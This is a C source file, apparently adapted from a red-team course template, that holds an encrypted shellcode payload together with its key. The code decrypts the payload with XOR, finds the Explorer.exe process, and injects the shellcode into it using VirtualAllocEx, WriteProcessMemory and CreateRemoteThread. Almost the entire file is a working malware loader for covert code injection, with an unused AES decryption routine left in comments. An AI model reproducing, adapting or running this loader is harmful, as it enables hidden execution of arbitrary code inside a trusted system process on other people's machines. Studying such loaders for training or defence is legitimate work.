/*

 Red Team Operator course code template
 payload encryption with AES
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include<tlhelp32.h>


/*int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}*/

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
				//printf("procname %s, %s\n", procname, pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
		
  
        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
		//printf("\nNotepad injected, before createRemoteThread\n");
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        //hThread = NULL;
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}




int main(void) {
    
	void * exec_mem;
	//BOOL rv;
	//HANDLE th;
    //DWORD oldprotect = 0;
	int pid = 0;
    HANDLE hProc = NULL;

	//char key[] = { 0x72, 0xfc, 0xf, 0x32, 0x5e, 0x2c, 0x76, 0xfe, 0x23, 0x58, 0x2f, 0xd7, 0xbe, 0x1a, 0x9a, 0x82 };
	char unsigned payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa5, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x34, 0x35, 0x3a, 0x54, 0xa6, 0xe, 0x2d, 0xee, 0x37, 0xd, 0x31, 0xf8, 0x37, 0x7b, 0x3a, 0xee, 0x26, 0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x31, 0x7c, 0xd2, 0x29, 0x38, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88, 0x31, 0x33, 0x34, 0x3c, 0xe0, 0x37, 0x45, 0xee, 0x2f, 0x45, 0x3b, 0x64, 0xb3, 0xf9, 0xe5, 0xfc, 0x6b, 0x65, 0x65, 0x2d, 0xe8, 0xb9, 0x7, 0x2, 0x2b, 0x73, 0xb5, 0x24, 0xe0, 0x2d, 0x7d, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x22, 0x23, 0x9a, 0xac, 0x24, 0xe6, 0x4d, 0xfb, 0x2d, 0x62, 0xa4, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x38, 0xb2, 0xac, 0x6e, 0x33, 0x64, 0xb5, 0x53, 0x85, 0x10, 0x94, 0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x3d, 0x21, 0xe6, 0x39, 0x57, 0x2c, 0x62, 0xa2, 0x3, 0x35, 0xe0, 0x69, 0x2d, 0x21, 0xe6, 0x39, 0x6f, 0x2c, 0x62, 0xa2, 0x24, 0xff, 0x6f, 0xed, 0x2d, 0x64, 0xbd, 0x38, 0x2b, 0x24, 0x3b, 0x2c, 0x3c, 0x2e, 0x2a, 0x3d, 0x24, 0x3c, 0x2c, 0x23, 0x3b, 0xe6, 0x8f, 0x52, 0x24, 0x26, 0x94, 0x85, 0x3d, 0x24, 0x34, 0x23, 0x3b, 0xee, 0x71, 0x9b, 0x32, 0x8b, 0x94, 0x9a, 0x38, 0x2c, 0xd3, 0xe, 0x0, 0x57, 0x3c, 0x41, 0x57, 0x74, 0x6b, 0x24, 0x33, 0x2c, 0xe4, 0x9f, 0x3b, 0xe4, 0x8f, 0xd2, 0x64, 0x74, 0x6b, 0x2c, 0xec, 0x80, 0x24, 0xc5, 0x71, 0x65, 0x72, 0x29, 0x6f, 0x7e, 0xe1, 0x6f, 0x24, 0x31, 0x24, 0xf0, 0x97, 0x29, 0xea, 0x83, 0x24, 0xce, 0x27, 0x12, 0x43, 0x62, 0x92, 0xac, 0x3f, 0xec, 0x89, 0x1a, 0x64, 0x75, 0x6b, 0x65, 0x3c, 0x24, 0xd7, 0x50, 0xf3, 0xe, 0x63, 0x8d, 0xb0, 0x24, 0x3b, 0x28, 0x54, 0xac, 0x20, 0x48, 0xb3, 0x2d, 0x9c, 0xb2, 0x2d, 0xfd, 0xa9, 0x2d, 0x9a, 0xa5, 0x25, 0xf0, 0xb2, 0x24, 0xd9, 0x98, 0x6a, 0xab, 0x8b, 0x9a, 0xb0, 0x2d, 0xe4, 0xbe, 0x19, 0x75, 0x22, 0x2a, 0x29, 0xfd, 0x89, 0x2d, 0xec, 0x9c, 0x2c, 0xc3, 0xea, 0xc0, 0x17, 0x13, 0x9a, 0xa1, 0x23, 0xe4, 0xa1, 0x25, 0x6f, 0x79, 0x73, 0x2c, 0xdb, 0x11, 0x8, 0x10, 0x6b, 0x65, 0x65, 0x65, 0x6d, 0x38, 0x23, 0x24, 0x33, 0x3a, 0xec, 0x96, 0x3c, 0x32, 0x32, 0x28, 0x5c, 0xb9, 0x19, 0x68, 0x3a, 0x33, 0x35, 0x96, 0x97, 0x3, 0xa2, 0x21, 0x49, 0x2d, 0x72, 0x64, 0x2b, 0xff, 0x21, 0x50, 0x73, 0xa3, 0x65, 0xd, 0x25, 0xf0, 0x95, 0x33, 0x33, 0x33, 0x35, 0x35, 0x3b, 0x24, 0x35, 0x2c, 0x92, 0xb9, 0x32, 0x35, 0x2a, 0x8d, 0xad, 0x39, 0xe2, 0xa4, 0x29, 0xec, 0xac, 0x38, 0xc9, 0x1c, 0xaf, 0x4d, 0xe3, 0x8b, 0xbe, 0x2d, 0x54, 0xb7, 0x25, 0x86, 0xb9, 0xee, 0x6d, 0x33, 0xdf, 0x7c, 0xec, 0x78, 0x5, 0x9a, 0xb8, 0xc2, 0x93, 0x78, 0x49, 0x78, 0x24, 0xce, 0xcd, 0xf0, 0xd8, 0xf8, 0x92, 0xac, 0x3b, 0xe6, 0xa7, 0x5a, 0x59, 0x72, 0x17, 0x6f, 0xe5, 0x9e, 0x8d, 0xc, 0x76, 0xde, 0x24, 0x61, 0x17, 0x1b, 0x1, 0x65, 0x3c, 0x24, 0xe4, 0xa3, 0x8c, 0xb0 };
	unsigned int len_payload = sizeof(payload);
	
	char key[] = "mysecretkeee";
	
	
	// Decrypt payload
	XOR((char *) payload, len_payload, key, sizeof(key));
	
	// Copy payload to allocated buffer
	

	//printf("\nHit me 2nd!\n");
	//getchar();
	
	//injection
	
	pid = FindTarget("Explorer.exe");
	
	

	if (pid) {
		//printf("Notepad.exe PID = %d\n", pid);
		//printf("\nHit me 2nd!\n");
		//getchar();

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
						//printf("hproc = %x", hProc);

		if (hProc != NULL) {
			//WaitForSingleObject(hProc, 500);
			Inject(hProc, (char *)payload, len_payload);
			CloseHandle(hProc);
		}
	}

	return 0;
}
